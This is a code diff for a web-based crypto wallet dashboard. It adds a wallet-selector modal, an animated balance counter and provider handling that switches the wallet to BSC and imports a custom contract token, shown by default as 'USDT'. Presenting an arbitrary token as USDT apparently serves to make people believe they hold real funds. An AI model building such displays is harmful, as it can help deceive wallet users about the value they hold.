@@ -21,10 +21,11 @@
         /* VVIP Header */
         .hero-bg { background: linear-gradient(180deg, rgba(38, 161, 123, 0.1) 0%, transparent 100%); padding: 24px 20px 30px; border-bottom: 1px solid rgba(255,255,255,0.02); }
         
-        .main-balance-text { font-size: 46px; font-weight: 800; letter-spacing: -1.5px; margin-top: 4px; color: #ffffff; display: flex; align-items: center; justify-content: center; }
+        .main-balance-text { font-size: 50px; font-weight: 800; letter-spacing: -1.5px; margin-top: 4px; color: #ffffff; display: flex; align-items: center; justify-content: center; text-shadow: 0 0 15px rgba(255,255,255,0.05); }
         .main-balance-text span { font-variant-numeric: tabular-nums; }
 
-        .status-badge { display: inline-flex; align-items: center; gap: 6px; background: var(--bg-card); padding: 8px 16px; border-radius: 30px; font-size: 12px; font-weight: 700; color: var(--text-muted); cursor: pointer; border: 1px solid rgba(255,255,255,0.05); }
+        .status-badge { display: inline-flex; align-items: center; gap: 6px; background: var(--bg-card); padding: 8px 16px; border-radius: 30px; font-size: 12px; font-weight: 700; color: var(--text-muted); cursor: pointer; border: 1px solid rgba(255,255,255,0.05); transition: 0.2s; }
+        .status-badge:active { transform: scale(0.95); }
         .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--danger); }
         .dot.connected { background: var(--neon-green); box-shadow: 0 0 8px var(--neon-green); }
 
@@ -47,14 +48,19 @@
         .asset-icon { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; }
         
         /* Modals */
-        .modal-bg { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); display: none; justify-content: center; align-items: flex-end; z-index: 50; }
-        .modal-pane { background: var(--bg-card); width: 100%; max-width: 440px; border-radius: 28px 28px 0 0; padding: 24px; animation: slideUp 0.3s; }
+        .modal-bg { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); display: none; justify-content: center; align-items: flex-end; z-index: 100; }
+        .modal-pane { background: var(--bg-card); width: 100%; max-width: 440px; border-radius: 28px 28px 0 0; padding: 24px; animation: slideUp 0.3s; border-top: 1px solid rgba(255,255,255,0.05); }
         @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+        
+        /* New Wallet Selector Buttons */
+        .wallet-opt { background: var(--bg-deep); padding: 16px 20px; border-radius: 16px; display: flex; align-items: center; gap: 14px; margin-bottom: 12px; cursor: pointer; border: 1px solid transparent; transition: 0.2s; }
+        .wallet-opt:hover, .wallet-opt:active { border-color: var(--neon-green); background: rgba(38, 161, 123, 0.05); }
+        
         .input-dark { background: var(--bg-deep); color: white; width: 100%; padding: 18px; border-radius: 16px; font-size: 15px; outline: none; border: 1px solid transparent; transition: 0.2s; font-family: 'Inter'; }
         .input-dark:focus { border-color: var(--neon-green); }
         
         /* Toast */
-        #toast { position: fixed; top: -50px; left: 50%; transform: translateX(-50%); background: #fff; color: #000; padding: 12px 24px; border-radius: 30px; font-size: 12px; font-weight: 700; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: 0.4s; z-index: 100; }
+        #toast { position: fixed; top: -50px; left: 50%; transform: translateX(-50%); background: #fff; color: #000; padding: 12px 24px; border-radius: 30px; font-size: 12px; font-weight: 700; box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: 0.4s; z-index: 200; }
         #toast.show { top: 20px; }
 
         /* Blink Animation for Live Sync */
@@ -74,7 +80,7 @@
                     <span class="font-bold text-[17px] tracking-tight">Account 1</span>
                 </div>
                 
-                <div class="status-badge" onclick="connectNode()" id="connectBtn">
+                <div class="status-badge" onclick="handleConnectClick()" id="connectBtn">
                     <div class="dot" id="statusDot"></div>
                     <span id="btnText">Connect</span>
                 </div>
@@ -166,6 +172,25 @@
 
     </div>
 
+    <div class="modal-bg" id="walletSelectorModal" onclick="if(event.target==this) document.getElementById('walletSelectorModal').style.display='none'">
+        <div class="modal-pane">
+            <div class="flex justify-between items-center mb-6">
+                <h3 class="font-bold text-[18px]">Select Wallet</h3>
+                <svg onclick="document.getElementById('walletSelectorModal').style.display='none'" class="w-6 h-6 text-[var(--text-muted)] cursor-pointer" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+            </div>
+            
+            <div class="wallet-opt" onclick="connectSpecificWallet('metamask')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg" class="w-8 h-8">
+                <span class="font-bold text-[16px]">MetaMask</span>
+            </div>
+            
+            <div class="wallet-opt" onclick="connectSpecificWallet('trustwallet')">
+                <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo_blue.png" class="w-8 h-8 rounded-full">
+                <span class="font-bold text-[16px]">Trust Wallet</span>
+            </div>
+        </div>
+    </div>
+
     <div class="modal-bg" id="sendModal" onclick="if(event.target==this) closeSendModal()">
         <div class="modal-pane">
             <div class="flex justify-between items-center mb-6">
@@ -197,6 +222,7 @@
         let realTimeLoop;
         let toastTimer;
         let currentBnbPrice = 580.00; 
+        let lastDisplayedBalance = 0; // Animation ke liye
 
         const marketList = [
             { id: 'BTCUSDT', name: 'Bitcoin', symbol: 'BTC', img: '1' },
@@ -211,7 +237,23 @@
             { id: 'DOTUSDT', name: 'Polkadot', symbol: 'DOT', img: '6636' }
         ];
 
-        // --- Multi-Wallet Global Fetcher ---
+        // --- NEW: Professional Balance Animation Logic ---
+        function animateValue(obj, start, end, duration) {
+            let startTimestamp = null;
+            const step = (timestamp) => {
+                if (!startTimestamp) startTimestamp = timestamp;
+                const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+                // Calculate current value and format it
+                const currentVal = (progress * (end - start) + start);
+                obj.innerHTML = currentVal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+                if (progress < 1) {
+                    window.requestAnimationFrame(step);
+                }
+            };
+            window.requestAnimationFrame(step);
+        }
+
+        // --- Multi-Wallet Global Fetcher (Used for Mobile) ---
         function getWeb3Wallet() {
             return window.ethereum || window.trustwallet || window.BinanceChain;
         }
@@ -274,13 +316,11 @@
             } catch(e) { console.log("Market API limits reached"); }
         }
 
-        // --- AUTO-NETWORK SWITCHER (BSC Enforcer - Safe Mode) ---
-        async function enforceBSC() {
-            const wallet = getWeb3Wallet();
+        // --- AUTO-NETWORK SWITCHER ---
+        async function enforceBSC(wallet) {
             if (!wallet) return;
             try {
                 const chainId = await wallet.request({ method: 'eth_chainId' });
-                // Check if not BSC (0x38 or 56)
                 if (chainId !== '0x38' && chainId !== 56 && chainId !== '56') {
                     await wallet.request({
                         method: 'wallet_switchEthereumChain',
@@ -299,23 +339,57 @@
                             blockExplorerUrls: ['https://bscscan.com/']
                         }]
                     });
-                } else {
-                    console.log("Network switch prompt handled by wallet.");
                 }
             }
         }
 
-        // --- Web3 Core ---
-        async function connectNode() {
-            const wallet = getWeb3Wallet();
-            if (!wallet) return showToast("Web3 Browser Required");
+        // --- NEW: Device Detector & Connection Router ---
+        function handleConnectClick() {
+            if (userAccount) return; // Pehle se connected hai toh kuch na karo
+            
+            // Mobile device detection (Regex)
+            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+            
+            if (isMobile) {
+                // Mobile par direct auto-connect (puraani logic)
+                connectSpecificWallet('auto');
+            } else {
+                // Laptop par modal kholo
+                document.getElementById('walletSelectorModal').style.display = 'flex';
+            }
+        }
+
+        // --- Core Connection Logic (Supports Both Specific & Auto) ---
+        async function connectSpecificWallet(walletType) {
+            let selectedProvider = null;
+
+            if (walletType === 'auto') {
+                selectedProvider = getWeb3Wallet(); // Mobile ke liye fallback
+            } else if (walletType === 'metamask') {
+                // MetaMask ko prefer karo
+                if (window.ethereum && window.ethereum.isMetaMask) {
+                    selectedProvider = window.ethereum;
+                } else {
+                    selectedProvider = window.ethereum; // Generic fallback
+                }
+            } else if (walletType === 'trustwallet') {
+                // Trust Wallet extension check
+                if (window.trustwallet) {
+                    selectedProvider = window.trustwallet;
+                } else {
+                    selectedProvider = window.ethereum; 
+                }
+            }
+
+            if (!selectedProvider) return showToast("Extension Not Found!");
+
             try {
-                const accounts = await wallet.request({ method: 'eth_requestAccounts' });
+                const accounts = await selectedProvider.request({ method: 'eth_requestAccounts' });
                 userAccount = accounts[0];
                 
-                await enforceBSC();
+                await enforceBSC(selectedProvider);
 
-                provider = new ethers.providers.Web3Provider(wallet);
+                provider = new ethers.providers.Web3Provider(selectedProvider);
                 signer = provider.getSigner();
                 contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
 
@@ -323,6 +397,9 @@
                 document.getElementById('statusDot').classList.add('connected');
                 document.getElementById('syncIndicator').classList.remove('hidden');
                 document.getElementById('syncIndicator').classList.add('flex');
+                
+                // Modal band karo
+                document.getElementById('walletSelectorModal').style.display = 'none';
 
                 fetchWalletBalances();
                 if(realTimeLoop) clearInterval(realTimeLoop);
@@ -339,21 +416,23 @@
             const btnText = document.getElementById('importBtnText');
             const originalText = btnText ? btnText.innerText : "+ Import Custom Token";
 
-            const wallet = getWeb3Wallet();
-            if (!wallet) return showToast("Wallet not found or not connected!");
+            // Token inject karte waqt current active provider lo
+            let currentActiveWallet = window.ethereum;
+            if (provider && provider.provider) currentActiveWallet = provider.provider;
+
+            if (!currentActiveWallet) return showToast("Wallet not connected!");
             
             try {
                 if(btnText) btnText.innerText = "Checking Network...";
-                await enforceBSC();
+                await enforceBSC(currentActiveWallet);
                 
                 let finalSymbol = "USDT";
                 let finalDecimals = 6;
 
                 if(btnText) btnText.innerText = "Fetching Data...";
                 
-                // THE SAFETY NET: Try fetching, if mobile RPC fails, quietly fallback to defaults.
                 try {
-                    const tempProvider = new ethers.providers.Web3Provider(wallet);
+                    const tempProvider = new ethers.providers.Web3Provider(currentActiveWallet);
                     const tempContract = new ethers.Contract(CONTRACT_ADDRESS, ABI, tempProvider);
                     finalSymbol = await tempContract.symbol();
                     finalDecimals = await tempContract.decimals();
@@ -363,7 +442,7 @@
                 
                 if(btnText) btnText.innerText = "Approve in Wallet...";
 
-                const wasAdded = await wallet.request({
+                const wasAdded = await currentActiveWallet.request({
                     method: 'wallet_watchAsset',
                     params: {
                         type: 'ERC20',
@@ -405,11 +484,17 @@
                 const usdtBalRaw = await contract.balanceOf(userAccount);
                 const dec = await contract.decimals();
                 const usdtBal = parseFloat(ethers.utils.formatUnits(usdtBalRaw, dec));
+                
                 const displayUsdt = usdtBal.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2});
                 
                 document.getElementById('rowUsdtBal').innerText = displayUsdt;
                 document.getElementById('rowUsdtVal').innerText = displayUsdt;
-                document.getElementById('mainVal').innerText = displayUsdt;
+                
+                // NEW: Animate main balance instead of hard text replacement
+                if (usdtBal !== lastDisplayedBalance) {
+                    animateValue(document.getElementById('mainVal'), lastDisplayedBalance, usdtBal, 800);
+                    lastDisplayedBalance = usdtBal;
+                }
                 
             } catch (e) {}
         }
